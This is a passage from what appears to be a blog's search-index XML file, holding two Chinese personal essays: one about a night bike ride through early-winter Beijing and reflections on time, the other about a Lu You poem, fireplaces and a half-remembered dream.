    <content type="text"><![CDATA[北京的冬天总是来得很早。故乡的旧时光里，秋凉一定是伴着满城花香而来，知了的噤声渐默，秋天消逝，以黄叶在风中缓缓下坠的姿态离去。北京的秋却截然不同：它在几阵凌冽的风席掠后逃逸，甚至来不及施舍一场薄雪留下脚印痕。 暖气是北京在冬天里得以与南方抗衡的最后的倔强。虽然免于寒冷的侵袭，本来干燥的空气，因此更加拧不出一点水来。我烦热极了，终于在某一天的夜幕里驱车驶出了学校大门，我没有方向，往拥挤的人群里骑，往最繁华的商业区骑，往最冷清的废草坪骑，累了便回去。 行过许多熟悉的地方，突然想起一年前每个初冬的夜晚，我曾在这座天桥上面对着这座城市的川流不息漫唱，这块儿河边的树林里我曾经录过歌，我受冻而颤抖的声音与风声巧妙地合拍。地点，骑车的人和他的行为，一切仿佛都没有变过，就好像我重复这一切，我就能一步穿越回去年的今天。 但我不愿重复。这一年来的种种，并不因我的一厢情愿而抹去。所以有时幻想，回忆如何不能像这座城市的秋天一般，在北风卷地的势不可挡里，如同百草一般消逝。这固然是不现实的，即使我挫骨扬灰从世界的账本里清零，我生前的种种善恶，也终将成为促成世界大风球的蝴蝶效应的因子。 遗憾的是，没能走过所有熟悉的地点，我的肢体告诉我它已然疲累。若我还是一年前的我，一定会感到意外的。体能不会说谎，岁月也是。人生挂历的十位在悄然翻页，我也无颜去争辩自己是否还是十年前的少年。 驱车返校的路比来时更加冷清，我在荒凉里逆行，在繁华里逆行，所以才显得与这个世界格格不入。我看到了更多的东西，灯火零星的路边，相拥取暖的恋人，烂醉如泥的男人，手里购物袋装着满满喜悦的女人。世界热闹起来了，寒冷赐予我的锋芒终于刺进了温热的棉花糖里，在狂欢的泥潭里慢慢融化。与这座城市上空所有无疾而终的水汽一起，成了凝华在我心窗上不化的雾凇。 2018.11.19 夜]]></content>
  </entry>
  <entry>
    <title><![CDATA[壁炉与梦境]]></title>
    <url>%2F2018%2F10%2F31%2F%E5%A3%81%E7%82%89%E4%B8%8E%E6%A2%A6%E5%A2%83%2F</url>
    <content type="text"><![CDATA[我合上电脑，已是凌晨两点。 数不清这是两周来多少次熬到夜深，但对于一个迟睡的人最大的幸运莫过于次日早晨无事，不必早起。 我是一个不能早起的人，是一个把自然醒奉为圭臬的人。 不知觉里翻身惊破了我的梦，看了看时间已是9点。 惺忪里消去一夜里手机产生的红点，看见一个app推送了这么一句诗词: 风卷江湖雨暗村，四山声作海涛翻。溪柴火软蛮毡暖，我与狸奴不出门。 大概意思就是外面风雨大作，我在家里什么都不做，围着火炉盖着小被子撸猫。 不禁艳羡起古人来，江南的油纸伞势必禁不住狂风骤雨的洗礼，所以从政的不用舟车劳顿四处转徙，商人可以在自家门前挂上一块今日无事的牌匾，若是在隆冬，壁炉就成了所有人共同的精神介质。 壁炉绝对是一个跨越了国界交融了文化的神奇之物。我向来不太爱听欧美的流行歌曲，总觉得是单纯的喧闹，又不如西方摇滚喧闹得有血有肉。但《safe&amp;sound》和其mv着实让我感觉惊艳美好，大概也是因为其中的壁炉。不管外面怎样荒凉，炉火与吉他声都温暖了整个木屋。 这时候又想起我惊破的那个梦来，大概是我遇到了一位很早的故友，我跟着她在都市的夜色下狂奔，她是如此地快速以至于我不能望其项背，最终在霓虹的末端不见了她的身影。 不太清楚梦的寓意，大概于我的壁炉，又是另外一种人生选择。 好奇心驱使下在百度上搜索了这个诗句，发现是放翁的《十一月四日风雨大作》其一。其二是”夜阑卧听风吹雨”，”两作都表达了作者报国无门的忧愤心情”。 我好长时间没说出话来。 10月31日 晨]]></content>
  </entry>
</search>
